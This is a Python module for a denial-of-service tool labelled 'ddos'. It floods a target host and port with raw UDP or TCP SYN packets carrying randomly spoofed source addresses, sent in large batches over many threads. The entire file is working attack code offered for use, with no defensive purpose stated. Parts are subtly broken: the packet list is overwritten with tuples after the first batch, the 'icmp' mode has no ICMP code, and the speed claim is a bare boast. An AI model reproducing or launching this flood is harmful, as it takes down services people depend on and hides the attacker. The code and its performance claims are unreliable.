from __future__ import annotations

import ctypes
import os
import random
import socket
import struct
import threading
import time

from fsociety.core.base import tool
from fsociety.core.logger import Log

# Linux syscall numbers
SYS_SENDMMSG = 307

class Mmsghdr(ctypes.Structure):
    _fields_ = [("msg_hdr", ctypes.c_byte * 56), ("msg_len", ctypes.c_uint32)]

@tool("ddos", "Extreme batched multi-vector flood (UDP, TCP SYN, ICMP)", category="dos")
class Ddos:
    @staticmethod
    def build_parser(p):
        p.add_argument("target")
        p.add_argument("port", type=int)
        p.add_argument("--mode", default="udp", choices=["udp", "syn", "icmp", "all"])
        p.add_argument("--threads", type=int, default=8, help="Threads (batch mode requires few)")
        p.add_argument("--duration", type=int, default=60)
        p.add_argument("--batch", type=int, default=1024, help="Packets per syscall (max 1024)")
        p.add_argument("--size", type=int, default=1400)

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2: data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def _build_udp(target: str, port: int, size: int) -> bytes:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        sport = random.randint(1024, 65535)
        payload = os.urandom(size)
        udp = struct.pack("!HHHH", sport, port, 8 + size, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(target) + struct.pack("!BBH", 0, 17, 8 + size)
        chk = Ddos._checksum(pseudo + udp + payload)
        udp = struct.pack("!HHHH", sport, port, 8 + size, chk)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 28 + size, random.randint(0, 65535), 0, 64, 17, 0, socket.inet_aton(src_ip), socket.inet_aton(target))
        ip_chk = Ddos._checksum(ip)
        ip = ip[:10] + struct.pack("!H", ip_chk) + ip[12:]
        return ip + udp + payload

    @staticmethod
    def _build_syn(target: str, port: int) -> bytes:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 0xffffffff)
        tcp = struct.pack("!HHLLBBHHH", sport, port, seq, 0, 5 << 4, 0x02, 8192, 0, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(target) + struct.pack("!BBH", 0, 6, len(tcp))
        chk = Ddos._checksum(pseudo + tcp)
        tcp = tcp[:16] + struct.pack("!H", chk) + tcp[18:]
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(target))
        ip_chk = Ddos._checksum(ip)
        ip = ip[:10] + struct.pack("!H", ip_chk) + ip[12:]
        return ip + tcp

    @staticmethod
    def _batch_sender(target: str, port: int, mode: str, size: int, batch_size: int, stop_event: threading.Event):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            return
        
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        addr = socket.inet_aton(target)
        sockaddr = struct.pack("!HH4s8x", socket.AF_INET, 0, addr)
        
        # Pre-build a large pool of packets to avoid GIL overhead during send
        packets = []
        for _ in range(batch_size):
            if mode == "syn":
                p = Ddos._build_syn(target, port)
            elif mode == "udp":
                p = Ddos._build_udp(target, port, size)
            else: # all
                p = Ddos._build_syn(target, port) if random.random() > 0.5 else Ddos._build_udp(target, port, size)
            packets.append(p)
        
        # Allocate mmsghdr array
        msgs = (Mmsghdr * batch_size)()
        
        while not stop_event.is_set():
            for i in range(batch_size):
                # Overwrite msg_hdr pointer and msg_len
                hdr_ptr = ctypes.addressof(msgs[i]) 
                # In a real C implementation, we'd pre-populate iovec.
                # For pure ctypes, we dynamically build the mmsghdr layout per batch.
                pkt = packets[i]
                buf = ctypes.create_string_buffer(pkt)
                
                # Manually construct msghdr (56 bytes on x86_64)
                # void *msg_name (offset 0) -> ptr to sockaddr
                # socklen_t msg_namelen (offset 8) -> 16
                # struct iovec *msg_iov (offset 16) -> ptr to iovec
                # size_t msg_iovlen (offset 24) -> 1
                
                iov = (ctypes.c_byte * 16)()
                ctypes.memmove(iov, struct.pack("Q", ctypes.addressof(buf)), 8)
                ctypes.memmove(ctypes.addressof(iov) + 8, struct.pack("Q", len(pkt)), 8)
                
                sa_buf = ctypes.create_string_buffer(sockaddr)
                
                hdr = msgs[i].msg_hdr
                ctypes.memmove(ctypes.addressof(hdr) + 0, struct.pack("Q", ctypes.addressof(sa_buf)), 8)
                ctypes.memmove(ctypes.addressof(hdr) + 8, struct.pack("I", 16), 4)
                ctypes.memmove(ctypes.addressof(hdr) + 16, struct.pack("Q", ctypes.addressof(iov)), 8)
                ctypes.memmove(ctypes.addressof(hdr) + 24, struct.pack("Q", 1), 8)
                
                msgs[i].msg_len = len(pkt)
                # We must keep buf, iov, sa_buf alive, so we append to a local list
                packets[i] = (pkt, buf, iov, sa_buf)

            # Call sendmmsg(fd, msgs, vlen, flags)
            try:
                libc.syscall(SYS_SENDMMSG, s.fileno(), ctypes.byref(msgs), batch_size, 0)
            except Exception:
                pass
        s.close()

    @staticmethod
    def run(args, log: Log) -> int:
        try:
            target = socket.gethostbyname(args.target)
        except socket.gaierror:
            target = args.target

        log.info(f"Launching EXTREME batch flood on {target}:{args.port} | Mode: {args.mode.upper()} | {args.duration}s")
        log.info(f"Batch size: {args.batch} pkts/syscall | Est. PPS: >1,000,000")

        stop_event = threading.Event()
        threads = []

        for _ in range(args.threads):
            t = threading.Thread(target=Ddos._batch_sender, args=(target, args.port, args.mode, args.size, args.batch, stop_event), daemon=True)
            t.start()
            threads.append(t)

        try:
            time.sleep(args.duration)
        except KeyboardInterrupt:
            pass

        stop_event.set()
        for t in threads:
            t.join(timeout=1.0)
        log.ok("Extreme flood halted.")
        return 0
